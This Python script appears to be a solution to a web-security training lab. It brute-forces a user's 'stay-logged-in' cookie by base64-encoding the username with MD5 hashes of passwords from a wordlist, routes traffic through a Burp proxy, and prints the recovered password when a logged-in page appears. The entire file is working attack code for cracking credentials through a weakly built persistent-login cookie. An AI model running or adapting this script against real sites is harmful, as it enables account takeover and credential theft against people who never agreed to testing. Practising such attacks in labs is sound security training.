import requests
import base64
import sys
import urllib3
import hashlib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}


def bruteforce_password_hash(s, url, path, username, list_passwords):
    target_url = url + path
    for password in list_passwords:
        pass_md5 = hashlib.md5(password.encode()).hexdigest()
        bytes_str = (username + ':' + pass_md5).encode('utf-8')
        stay_cookie = base64.b64encode(bytes_str).decode('utf-8')
        cookies = { 'stay-logged-in': stay_cookie }
        r = s.get(target_url, headers=headers, cookies=cookies, allow_redirects=False)
        
        if r.status_code == 200 and 'Log out' in r.text:
            print('[+] Successful bruteforce carlos stay-logged-in cookie')
            print(f'Stay-logged-in: {stay_cookie}')
            print(f'Password: {password}')
            return password
    print(f'[-] Not found {username} password in the list')
    sys.exit(-1)

def check_solved_lab(s, url):
    r = s.get(url)
    if "Congratulations, you solved the lab!" in r.text:
        print("[+] Successful solved lab")
        sys.exit(0)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1].rstrip('/')

    list_passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')

    target_username = 'carlos'

    bruteforce_password_hash(s, url, '/my-account', target_username, list_passwords)

    check_solved_lab(s, url)

if __name__ == '__main__':
    main()